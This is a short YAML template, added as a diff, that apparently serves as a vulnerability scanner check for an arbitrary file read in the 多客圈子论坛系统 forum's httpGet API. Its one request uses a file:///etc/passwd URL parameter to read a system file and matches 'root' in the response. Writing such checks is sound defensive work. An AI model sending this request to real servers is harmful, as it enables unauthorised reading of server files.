@@ -1,0 +1,17 @@
+id:
+
+info:
+  name: 多客圈子论坛系统httpGet 任意文件读取
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /index.php/api/login/httpGet?url=file:///etc/passwd
+response1:
+  headers:
+  body: root
+  code: 200
+requests2:
+response2:
